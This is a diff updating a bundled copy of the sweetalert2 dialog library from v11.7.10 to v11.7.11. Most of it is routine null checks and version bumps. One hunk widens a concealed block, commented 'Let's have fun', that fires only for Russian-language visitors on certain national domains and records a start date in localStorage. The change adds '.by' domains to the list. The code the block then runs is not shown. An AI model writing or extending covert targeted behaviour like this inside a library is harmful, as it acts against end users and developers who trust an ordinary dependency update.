@@ -79,7 +79,7 @@
     var sweetalert2 = {exports: {}};
 
     /*!
-    * sweetalert2 v11.7.10
+    * sweetalert2 v11.7.11
     * Released under the MIT License.
     */
 
@@ -1091,12 +1091,15 @@
     	   */
     	  const renderCloseButton = (instance, params) => {
     	    const closeButton = getCloseButton();
-    	    setInnerHtml(closeButton, params.closeButtonHtml);
+    	    if (!closeButton) {
+    	      return;
+    	    }
+    	    setInnerHtml(closeButton, params.closeButtonHtml || '');
 
     	    // Custom class
     	    applyCustomClass(closeButton, params, 'closeButton');
     	    toggle(closeButton, params.showCloseButton);
-    	    closeButton.setAttribute('aria-label', params.closeButtonAriaLabel);
+    	    closeButton.setAttribute('aria-label', params.closeButtonAriaLabel || '');
     	  };
 
     	  /**
@@ -1425,6 +1428,9 @@
     	   */
     	  const renderContent = (instance, params) => {
     	    const htmlContainer = getHtmlContainer();
+    	    if (!htmlContainer) {
+    	      return;
+    	    }
     	    applyCustomClass(htmlContainer, params, 'htmlContainer');
 
     	    // Content as HTML
@@ -4189,7 +4195,7 @@
     	  };
 
     	  // Dear russian users visiting russian sites. Let's have fun.
-    	  if (typeof window !== 'undefined' && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|xn--p1ai)$/)) {
+    	  if (typeof window !== 'undefined' && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|by|xn--p1ai)$/)) {
     	    const now = new Date();
     	    const initiationDate = localStorage.getItem('swal-initiation');
     	    if (!initiationDate) {
@@ -4245,7 +4251,7 @@
     	    };
     	  });
     	  SweetAlert.DismissReason = DismissReason;
-    	  SweetAlert.version = '11.7.10';
+    	  SweetAlert.version = '11.7.11';
 
     	  const Swal = SweetAlert;
     	  // @ts-ignore
